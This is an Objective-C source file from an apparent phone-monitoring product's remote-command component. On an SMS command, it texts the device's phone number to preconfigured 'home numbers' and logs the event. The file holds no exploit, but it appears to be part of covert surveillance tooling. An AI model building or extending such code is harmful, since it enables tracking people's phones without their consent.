/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestMobileNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  14/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RequestMobileNumberProcessor.h"
#import "PrefHomeNumber.h"
#import "Preference.h"
#import "FxSystemEvent.h"
#import "DateTimeFormat.h"

@interface RequestMobileNumberProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) processRequestMobileNumber;
- (void) requestMobileNumberException;
- (void) sendReplySMS;
- (void) createAndSendSystemEventForSMSSentToHomeNumber: (NSString *) aMessage;
@end

@implementation RequestMobileNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RequestMobileNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (RequestMobileNumberProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"RequestMobileNumberProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestMobileNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestMobileNumberProcessor--->doProcessingCommand");
	[self processRequestMobileNumber];
}

#pragma mark RequestMobileNumberProcessor PrivateAPI Methods

/**
 - Method name: processRequestMobileNumber
 - Purpose:This method is used to process request mobile number
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) processRequestMobileNumber {
	id <AppContext> aAppContext = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
	id <ProductInfo> aProductInfo = [aAppContext getProductInfo];
	//Activation Code
	NSString *activationCode = [[mRemoteCmdData mArguments] objectAtIndex:1];
	//Create notificationStringForCommand
	NSString *messageString = [aProductInfo notificationStringForCommand:kNotificationReportPhoneNumberCommandID 
													  withActivationCode:activationCode
																 withArg:nil];
	DLog(@"messageString: %@", messageString)
	//Retrieve home numbers
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	NSArray *homeList = [prefHomeNumberList mHomeNumbers];
	
	if (![homeList count]) {
		[self requestMobileNumberException];
	}
	else {
		//Send message string to homeNumbers
		for (NSString *homeNumber in homeList) {
			[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:homeNumber
																   andMessage:messageString];
		}
		//Create system event for SMS sent to home number
		[self createAndSendSystemEventForSMSSentToHomeNumber:messageString];
		
		//Send Normal SMS and Create System Event
		[self sendReplySMS];
	}

}

/**
 - Method name:sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"RequestMobileNumberProcessor--->sendReplySMS")
	
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	
	NSString *requestMobileNumberMessage = NSLocalizedString(@"kRequestMobileNumber",@"");
	
	requestMobileNumberMessage = [messageFormat stringByAppendingString:requestMobileNumberMessage];
	
	// create system event for remote command
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:requestMobileNumberMessage];
	
	// create reply SMS
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:requestMobileNumberMessage];
	}
}

/**
 - Method name: requestMobileNumberException
 - Purpose:This method is invoked when requestMobileNumber process Failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) requestMobileNumberException  {
	DLog (@"requestMobileNumberException---->requestMobileNumberException")
	FxException* exception = [FxException exceptionWithName:@"requestMobileNumberException" andReason:@"Request Mobile Number Error"];
	[exception setErrorCode:kNoHomeNumber];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

- (void) createAndSendSystemEventForSMSSentToHomeNumber: (NSString *) aMessage {
	// create system event for SMS sent to home number
	FxSystemEvent *sysEvent = [[FxSystemEvent alloc] init];
	[sysEvent setMessage:aMessage];
	[sysEvent setDirection:kEventDirectionOut];
	[sysEvent setSystemEventType:kSystemEventTypeUpdatePhoneNumberToHome];
	[sysEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	if ([[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate] respondsToSelector:@selector(eventFinished:)]) {
		[[[RemoteCmdUtils sharedRemoteCmdUtils] mEventDelegate] performSelector:@selector(eventFinished:) withObject:sysEvent];
	}
	[sysEvent release];	
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end